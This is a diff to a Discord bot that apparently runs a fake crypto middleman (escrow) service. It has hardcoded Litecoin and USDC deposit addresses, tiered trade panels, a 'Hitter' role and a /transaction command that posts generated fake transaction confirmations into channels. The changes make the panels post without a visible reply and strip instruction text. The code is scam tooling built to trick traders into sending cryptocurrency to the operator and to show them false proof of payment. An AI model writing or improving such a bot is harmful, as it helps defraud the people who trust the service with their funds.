@@ -15,7 +15,6 @@ const OWNER_ID = '1422945082746601594';
 const HITTER_ROLE_ID = '1484680314772000902';
 const FINANCE_ROLE_ID = '1485363449897681017';
 
-// Hardcoded addresses
 const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
 const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
 
@@ -117,7 +116,7 @@ client.on(Events.GuildMemberUpdate, (oldM, newM) => {
 client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
     
-    const { commandName, member, user } = interaction;
+    const { commandName, member, user, channel } = interaction;
     console.log(`[CMD] /${commandName} by ${user.tag}`);
 
     const deny = (msg) => interaction.reply({ content: `❌ ${msg}`, ephemeral: true });
@@ -141,7 +140,10 @@ client.on(Events.InteractionCreate, async (interaction) => {
                     new ButtonBuilder().setCustomId('tier2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
                     new ButtonBuilder().setCustomId('tier3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇')
                 );
-                await interaction.reply({ embeds: [panelEmbed], components: [panelRow] });
+                // Silent - no reply, just post panel
+                await channel.send({ embeds: [panelEmbed], components: [panelRow] });
+                await interaction.deferReply({ ephemeral: true });
+                await interaction.deleteReply();
                 break;
 
             case 'manual':
@@ -161,7 +163,10 @@ client.on(Events.InteractionCreate, async (interaction) => {
                     new ButtonBuilder().setCustomId('manual_tier2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'),
                     new ButtonBuilder().setCustomId('manual_tier3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇')
                 );
-                await interaction.reply({ embeds: [manualEmbed], components: [manualRow] });
+                // Silent - no reply, just post panel
+                await channel.send({ embeds: [manualEmbed], components: [manualRow] });
+                await interaction.deferReply({ ephemeral: true });
+                await interaction.deleteReply();
                 break;
 
             case 'tickets':
@@ -191,8 +196,8 @@ client.on(Events.InteractionCreate, async (interaction) => {
             case 'transaction':
                 if (!hasHitter(member) && !isOwner(user.id)) return deny('Hitter role required.');
                 const chId = interaction.options.getString('channelid');
-                const channel = await client.channels.fetch(chId).catch(() => null);
-                if (!channel) return deny('Invalid channel ID.');
+                const txChannel = await client.channels.fetch(chId).catch(() => null);
+                if (!txChannel) return deny('Invalid channel ID.');
                 
                 const fakeTx = generateFakeTransaction();
                 const txEmbed = new EmbedBuilder()
@@ -208,7 +213,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
                     .setColor(0x00FF00)
                     .setTimestamp();
                 
-                await channel.send({ embeds: [txEmbed] });
+                await txChannel.send({ embeds: [txEmbed] });
                 await interaction.reply({ content: `✅ Fake transaction sent to <#${chId}>`, ephemeral: true });
                 break;
 
@@ -228,17 +233,15 @@ client.on(Events.InteractionCreate, async (interaction) => {
         }
     } catch (err) {
         console.error(`[ERR] /${commandName}:`, err);
-        if (!interaction.replied) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true });
+        if (!interaction.replied && !interaction.deferred) await interaction.reply({ content: '❌ Error occurred.', ephemeral: true });
     }
 });
 
-// Button handler
 client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isButton()) return;
     
     const { customId, user } = interaction;
     
-    // Auto MM tiers - open crypto selection modal
     if (['tier1', 'tier2', 'tier3'].includes(customId)) {
         const tier = customId.replace('tier', '');
         
@@ -268,7 +271,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
         await interaction.showModal(modal);
     }
     
-    // Manual MM tiers - direct LTC ticket
     if (customId.startsWith('manual_tier')) {
         const tier = customId.replace('manual_tier', '');
         const limits = { '1': 200, '2': 500, '3': 1000 };
@@ -296,8 +298,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
                 .addFields(
                     { name: 'Deposit Address (LTC)', value: `\`${LTC_ADDRESS}\``, inline: false },
                     { name: 'Network', value: 'Litecoin', inline: true },
-                    { name: 'Status', value: '⏳ Waiting for middleman...', inline: true },
-                    { name: 'Instructions', value: '1. Wait for middleman to join\n2. Send LTC to address above\n3. Middleman confirms and releases', inline: false }
+                    { name: 'Status', value: '⏳ Waiting for middleman...', inline: true }
                 )
                 .setColor(0xBFBBBB);
 
@@ -322,7 +323,6 @@ client.on(Events.InteractionCreate, async (interaction) => {
     }
 });
 
-// Modal submit handler
 client.on(Events.InteractionCreate, async (interaction) => {
     if (!interaction.isModalSubmit()) return;
     
@@ -364,8 +364,7 @@ client.on(Events.InteractionCreate, async (interaction) => {
                 .addFields(
                     { name: 'Deposit Address', value: `\`${address}\``, inline: false },
                     { name: 'Network', value: network, inline: true },
-                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true },
-                    { name: 'Instructions', value: `1. Send exact ${crypto} amount\n2. Wait for 6 confirmations\n3. Bot releases funds automatically`, inline: false }
+                    { name: 'Status', value: '⏳ Awaiting deposit...', inline: true }
                 )
                 .setColor(color);
 
